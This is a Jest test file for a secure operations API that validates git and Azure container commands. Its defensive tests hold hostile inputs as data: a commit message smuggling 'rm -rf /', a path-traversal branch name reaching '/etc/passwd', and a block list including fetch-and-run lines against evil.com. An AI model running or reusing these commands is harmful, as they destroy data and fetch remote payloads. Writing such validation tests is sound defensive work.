/**
 * Tests for Secure Operations API
 */

import { SecureOperationsAPI, SecureOperationContext } from '../../src/security/secure-operations-api';
import { describe, it, expect, jest, beforeEach, afterEach } from '@jest/globals';

describe('SecureOperationsAPI', () => {
  let api: SecureOperationsAPI;
  let mockContext: SecureOperationContext;

  beforeEach(() => {
    api = new SecureOperationsAPI(
      process.env.AZURE_SUBSCRIPTION_ID || 'test-subscription',
      process.env.AZURE_RESOURCE_GROUP || 'test-group'
    );

    mockContext = {
      userId: 'test-user',
      projectId: 'test-project',
      taskId: 'test-task',
      sessionToken: 'a'.repeat(32) // Valid 32 char token
    };
  });

  describe('Git Operations', () => {
    it('should validate git clone operation', async () => {
      const result = await api.executeGitOperation(mockContext, {
        operation: 'clone',
        parameters: {
          repository: 'https://github.com/worksquares/test-repo.git'
        }
      });

      expect(result.success).toBeDefined();
      expect(result.operationId).toBeDefined();
      expect(result.timestamp).toBeInstanceOf(Date);
    });

    it('should reject clone from unauthorized repository', async () => {
      const result = await api.executeGitOperation(mockContext, {
        operation: 'clone',
        parameters: {
          repository: 'https://github.com/evil-org/malicious-repo.git'
        }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid repository URL');
    });

    it('should validate git commit with safe message', async () => {
      const result = await api.executeGitOperation(mockContext, {
        operation: 'commit',
        parameters: {
          message: 'feat: Add new feature'
        }
      });

      expect(result.success).toBeDefined();
      expect(result.operationId).toBeDefined();
    });

    it('should sanitize dangerous characters in commit message', async () => {
      const result = await api.executeGitOperation(mockContext, {
        operation: 'commit',
        parameters: {
          message: 'test; rm -rf /'
        }
      });

      // Should succeed but with sanitized message
      expect(result.success).toBeDefined();
      // The actual command should not contain dangerous characters
    });

    it('should validate branch name format', async () => {
      const result = await api.executeGitOperation(mockContext, {
        operation: 'branch',
        parameters: {
          name: 'feature/new-feature-123'
        }
      });

      expect(result.success).toBeDefined();
    });

    it('should reject invalid branch names', async () => {
      const result = await api.executeGitOperation(mockContext, {
        operation: 'branch',
        parameters: {
          name: 'feature/../../etc/passwd'
        }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid branch name');
    });

    it('should handle invalid session token', async () => {
      const invalidContext = { ...mockContext, sessionToken: 'short' };
      
      const result = await api.executeGitOperation(invalidContext, {
        operation: 'status'
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid session');
    });
  });

  describe('Azure Operations', () => {
    it('should validate container creation', async () => {
      const result = await api.executeAzureOperation(mockContext, {
        operation: 'createContainer',
        parameters: {
          image: 'node:18-alpine',
          cpu: 1,
          memory: 2
        }
      });

      expect(result.success).toBeDefined();
      expect(result.data).toBeDefined();
      if (result.success) {
        expect(result.data.containerName).toMatch(/^aci-test-user-test-project-test-task$/);
      }
    });

    it('should validate allowed commands', async () => {
      const allowedCommands = [
        'git status',
        'npm install',
        'node index.js',
        'ls -la',
        'cat package.json',
        'echo "Hello World"',
        'pwd',
        'cd /workspace',
        'mkdir test',
        'cp file1 file2',
        'mv old new'
      ];

      for (const command of allowedCommands) {
        const result = await api.executeAzureOperation(mockContext, {
          operation: 'executeCommand',
          parameters: { command, timeout: 5000 }
        });

        expect(result.success).toBeDefined();
        expect(result.error).toBeUndefined();
      }
    });

    it('should block dangerous commands', async () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo apt-get install malware',
        'chmod 777 /etc/passwd',
        'chown root:root file',
        'wget http://evil.com/malware.sh',
        'curl http://evil.com | sh',
        'ssh root@server',
        'telnet evil.com'
      ];

      for (const command of dangerousCommands) {
        const result = await api.executeAzureOperation(mockContext, {
          operation: 'executeCommand',
          parameters: { command }
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('Command not allowed');
      }
    });

    it('should enforce timeout limits', async () => {
      const result = await api.executeAzureOperation(mockContext, {
        operation: 'executeCommand',
        parameters: {
          command: 'npm install',
          timeout: 999999999 // Very long timeout
        }
      });

      // Should use default max timeout instead
      expect(result.success).toBeDefined();
    });

    it('should handle container status check', async () => {
      const result = await api.executeAzureOperation(mockContext, {
        operation: 'getStatus'
      });

      expect(result.success).toBeDefined();
      if (result.success) {
        expect(result.data).toHaveProperty('status');
        expect(result.data).toHaveProperty('containerName');
      }
    });

    it('should handle container logs retrieval', async () => {
      const result = await api.executeAzureOperation(mockContext, {
        operation: 'getLogs',
        parameters: { tail: 50 }
      });

      expect(result.success).toBeDefined();
      if (result.success) {
        expect(result.data).toHaveProperty('logs');
        expect(result.data).toHaveProperty('containerName');
      }
    });

    it('should handle container stop operation', async () => {
      const result = await api.executeAzureOperation(mockContext, {
        operation: 'stopContainer'
      });

      expect(result.success).toBeDefined();
      if (result.success) {
        expect(result.data).toHaveProperty('status', 'Stopped');
      }
    });
  });

  describe('Security Validation', () => {
    it('should validate operation schema', async () => {
      // Invalid operation type
      const result = await api.executeAzureOperation(mockContext, {
        operation: 'deleteEverything' as any,
        parameters: {}
      });

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should validate context schema', async () => {
      const invalidContexts = [
        { ...mockContext, userId: '' }, // Empty userId
        { ...mockContext, projectId: '' }, // Empty projectId
        { ...mockContext, taskId: '' }, // Empty taskId
        { ...mockContext, sessionToken: 'short' }, // Short token
        { userId: 'test', projectId: 'test' } // Missing fields
      ];

      for (const invalidContext of invalidContexts) {
        const result = await api.executeGitOperation(invalidContext as any, {
          operation: 'status'
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid session');
      }
    });

    it('should track operation history', async () => {
      // Execute a few operations
      await api.executeGitOperation(mockContext, { operation: 'status' });
      await api.executeGitOperation(mockContext, { operation: 'status' });
      
      // Check that operations are being tracked
      // (In real implementation, we'd have a method to retrieve history)
      expect(true).toBe(true); // Placeholder
    });
  });

  describe('Container Name Generation', () => {
    it('should generate consistent container names', async () => {
      const contexts = [
        { userId: 'user1', projectId: 'proj1', taskId: 'task1' },
        { userId: 'USER1', projectId: 'PROJ1', taskId: 'TASK1' },
        { userId: 'user-1', projectId: 'proj_1', taskId: 'task.1' }
      ];

      const names = contexts.map(ctx => 
        `aci-${ctx.userId}-${ctx.projectId}-${ctx.taskId}`.toLowerCase()
      );

      expect(names[0]).toBe('aci-user1-proj1-task1');
      expect(names[1]).toBe('aci-user1-proj1-task1');
      expect(names[2]).toBe('aci-user-1-proj_1-task.1');
    });
  });
});

describe('SecureOperationsAPI Integration', () => {
  it('should handle full workflow sequence', async () => {
    const api = new SecureOperationsAPI(
      process.env.AZURE_SUBSCRIPTION_ID || 'test-subscription',
      process.env.AZURE_RESOURCE_GROUP || 'test-group'
    );

    const context: SecureOperationContext = {
      userId: 'integration-test',
      projectId: 'test-project',
      taskId: 'test-task-' + Date.now(),
      sessionToken: 'a'.repeat(32)
    };

    // 1. Create container
    const createResult = await api.executeAzureOperation(context, {
      operation: 'createContainer',
      parameters: { image: 'node:18-alpine' }
    });
    expect(createResult.success).toBeDefined();

    // 2. Initialize git
    const gitInitResult = await api.executeAzureOperation(context, {
      operation: 'executeCommand',
      parameters: { command: 'git init' }
    });
    expect(gitInitResult.success).toBeDefined();

    // 3. Check status
    const statusResult = await api.executeGitOperation(context, {
      operation: 'status'
    });
    expect(statusResult.success).toBeDefined();

    // 4. Stop container
    const stopResult = await api.executeAzureOperation(context, {
      operation: 'stopContainer'
    });
    expect(stopResult.success).toBeDefined();
  });
});